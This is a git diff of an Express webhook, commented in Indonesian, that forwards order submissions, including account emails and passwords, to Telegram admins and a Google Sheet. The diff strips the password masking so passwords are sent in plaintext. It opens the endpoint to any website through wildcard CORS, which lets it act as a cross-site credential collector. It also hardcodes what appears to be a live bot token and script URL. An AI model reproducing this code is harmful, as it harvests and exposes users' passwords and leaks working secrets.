@@ -5,13 +5,24 @@ const app = express()
 app.use(express.json())
 app.use(express.urlencoded({ extended: true }))
 
-/* ================= KONFIGURASI ================= */
-const BOT_TOKEN = 'ISI_TOKEN_BOT_KAMU'
-const ADMIN_IDS = ['5555675824'] // bisa tambah admin
-const SECRET_KEY = 'xstreamku'
-const SHEET_URL = 'ISI_URL_GOOGLE_SHEET_EXEC'
+/* ================= CORS FIX (WAJIB) ================= */
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*')
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(200)
+  }
+  next()
+})
+/* ==================================================== */
 
-/* ============================================== */
+/* ============== KONFIGURASI ================= */
+const BOT_TOKEN = '8229069332:AAG_xJtl6ZRMexHENgI_f9uEAd6HnXR3WFA'
+const ADMIN_IDS = ['5555675824']
+const SECRET_KEY = 'xstreamku'
+const SHEET_URL = 'https://script.google.com/macros/s/AKfycbyIAq9u5_MLY90OY_5FPe7J-CE5Yz922UPc7ebU7VnsiXSLwXTikLd1A32DUvNv1CDv/exec'
+/* ============================================ */
 
 app.all('/webhook', async (req, res) => {
   try {
@@ -35,40 +46,29 @@ app.all('/webhook', async (req, res) => {
       kontak: req.body.kontak || req.query.kontak || '-',
       email_akun: req.body.email_akun || '-',
       password_akun: req.body.password_akun || '-',
-      website: req.headers.host || '-',
+      website: req.headers.origin || req.headers.host || '-',
       ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
     }
 
     const waktu = new Date().toLocaleString('id-ID')
 
-    /* 🏷️ TITLE */
+    /* 🏷️ JUDUL */
     let title = '🛒 ORDER MASUK'
     if (tipe === 'PAID') title = '💰 PEMBAYARAN BERHASIL'
     if (tipe === 'DONE') title = '✅ PESANAN SELESAI'
     if (tipe === 'TEST') title = '🧪 TEST WEBHOOK'
 
-    /* 🔐 MASK PASSWORD */
-    const maskedPassword =
-      data.password_akun && data.password_akun !== '-'
-        ? data.password_akun.slice(0, 2) + '****' + data.password_akun.slice(-2)
-        : '-'
-
-    /* 📩 FORMAT TELEGRAM */
-    const message = `
-${title}
+    /* ✉️ FORMAT NOTIF */
+    const message = `${title}
 
 📦 Produk   : ${data.produk}
 👤 Nama     : ${data.nama}
 📞 Kontak   : ${data.kontak}
-🌐 Website  : ${data.website}
-
-🔐 Akun
 📧 Email    : ${data.email_akun}
-🔑 Password : ${maskedPassword}
-
+🔑 Password : ${data.password_akun}
+🌐 Website  : ${data.website}
 🕒 Waktu    : ${waktu}
-📌 Status   : ${tipe}
-`.trim()
+`
 
     /* 📲 KIRIM TELEGRAM */
     for (const chat_id of ADMIN_IDS) {
@@ -82,15 +82,15 @@ ${title}
       })
     }
 
-    /* 📊 SIMPAN KE GOOGLE SHEETS */
-    if (SHEET_URL.startsWith('https')) {
+    /* 📊 GOOGLE SHEET (OPTIONAL) */
+    if (SHEET_URL && SHEET_URL.startsWith('https')) {
       await fetch(SHEET_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           waktu,
-          status: tipe,
-          ...data
+          ...data,
+          status: tipe
         })
       })
     }
@@ -98,11 +98,11 @@ ${title}
     res.send('OK')
   } catch (err) {
     console.error('WEBHOOK ERROR:', err)
-    res.send('ERROR')
+    res.status(500).send('ERROR')
   }
 })
 
 const PORT = process.env.PORT || 3000
 app.listen(PORT, () => {
-  console.log('🚀 Webhook PRODUKSI AKTIF')
+  console.log('🚀 Webhook aktif & CORS aman')
 })
